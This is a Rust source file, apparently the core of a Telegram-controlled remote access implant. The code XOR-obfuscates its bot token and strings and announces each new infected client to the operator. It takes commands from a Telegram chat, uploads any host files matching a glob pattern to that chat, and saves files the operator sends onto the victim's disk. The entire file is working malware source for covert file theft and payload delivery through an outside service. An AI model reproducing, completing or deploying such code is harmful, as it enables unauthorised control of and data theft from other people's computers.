use anyhow::{Result, bail};
use tokio;
use glob::glob;
use teloxide::prelude::*;
use teloxide::types::{InputFile, ParseMode};
use serenity::async_trait;

mod modules;
mod core;

struct Telegram {
    bot : Bot,
    msg : Message,
}

/////////

#[tokio::main]
async fn main() -> Result<()> {

    ///////////////////////////////////////////
    // [!] Simple XOR obfuscation is applied, the encoded values will still be hardcoded in the binary
    let bot_token  = obfuscate!("YOUR_TELEGRAM_TOKEN");
    let id: i64    = 123456789;
    ///////////////////////////////////////////

    let s = obfuscate!("[*] Connecting to Telegram ...");
    println!("{s}");
    bot_connect(&bot_token, id).await?;

    Ok(())
}

/////////

async fn bot_connect(bot_token: &str, id: i64) -> Result<()> {

    let bot = Bot::new(bot_token);
    let chat_id = ChatId(id);

    // Sending a notification message
    let user_id = modules::user::id().await?;
    let msg  = &format!("{}{}", obfuscate!("New client: "), user_id);
    bot.send_message(chat_id, msg).await?;
 
    let handler = Update::filter_message().branch(dptree::endpoint(handler));

    Dispatcher::builder(bot, handler)
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;

    Ok(())
}

fn style(text: &str) -> String {
    text.replace("*b_", "<b>")
        .replace("_b*", "</b>")
        .replace("*c_", "<code>")
        .replace("_c*", "</code>")

}

// Implementig a MessageSender trait to ensure the compatibility between different bot APIs
#[async_trait]
impl core::commands::MessageSender for Telegram {
    // message sender function
    async fn message(&self, content: &str) -> Result<()> {
        let content = style(content);
        self.bot.send_message(self.msg.chat.id, &content).parse_mode(ParseMode::Html).await?;
        
        Ok(())
    }
    // file upload 
    async fn upload(&self, pattern: String) -> Result<()> {

        let mut files_found = false;
        // Using glob for pattern matching, for example "/upload *.jpg" etc.
        if let Ok(paths) = glob(&pattern) {
            for path in paths.flatten() {
                if path.exists(){
                    files_found = true;
                    let file = InputFile::file(&path);
                    if let Err(e) = self.bot.send_document(self.msg.chat.id, file).await {
                        let msg = obfuscate!("Failed to upload file: ");
                        self.bot.send_message(self.msg.chat.id, format!("{msg}{} : {e}", path.display())).await?; 
                    }   
                }
            }
        }
        if !files_found {
            let msg = obfuscate!("No files found matching pattern : ");
            self.bot.send_message(self.msg.chat.id, format!("{msg}'{}'.", pattern)).await?;
        }
        Ok(())
    }
}

async fn handler(bot: Bot, msg: Message) -> ResponseResult<()> {

    if let Some(cmd) = msg.clone().text() {
        let sender = Telegram {
            bot: bot,
            msg: msg
        };

        // Commands dispatcher
        core::commands::command_handler(&sender, cmd.to_lowercase().as_str()).await;
    }

    // Handling the auto download of the images/documents/videos sent by the user in the chat!
    else if msg.document().is_some() || msg.photo().is_some() || msg.video().is_some(){
        match auto_download(bot.clone(), msg.clone()).await {
            Ok(output) => bot.send_message(msg.chat.id, output).await?,
            Err(e) =>  bot.send_message(msg.chat.id, format!("{}", e)).await?
        };   
    }
    Ok(())
}

async fn auto_download(bot: Bot, msg: Message) -> Result<String> {
        // Generating a random name
        let rand_name = modules::random::random_name();

        let (file_id, file_name) = if let Some(doc) = msg.document() {
            (doc.file.id.clone(), doc.file_name.clone().unwrap_or_else(|| rand_name))
        } else if let Some(photo) = msg.photo().and_then(|p| p.last()) {
            (photo.file.id.clone(), rand_name)
        } else if let Some(video) = msg.video() {
            (video.file.id.clone(), video.file_name.clone().unwrap_or_else(|| rand_name))
        } else {
            bail!("Unsupported");
        };

        let file = match bot.get_file(file_id).await {
            Ok(f) => f,
            Err(e) => bail!("{e}"),
        };

        let url = format!("{}{}/{}", obfuscate!("https://api.telegram.org/file/bot"), bot.token(), file.path);
        let resp = match reqwest::get(&url).await {
            Ok(r) => r,
            Err(e) => bail!("{e}"),
        };

        let bytes = match resp.bytes().await {
            Ok(b) => b,
            Err(e) => bail!("{e}"),
        };

        let output = match tokio::fs::write(&file_name, bytes).await {
            Ok(_) => format!("Saved to : {}", file_name),
            Err(e) => bail!("{e}"),
        };

        Ok(output)
}
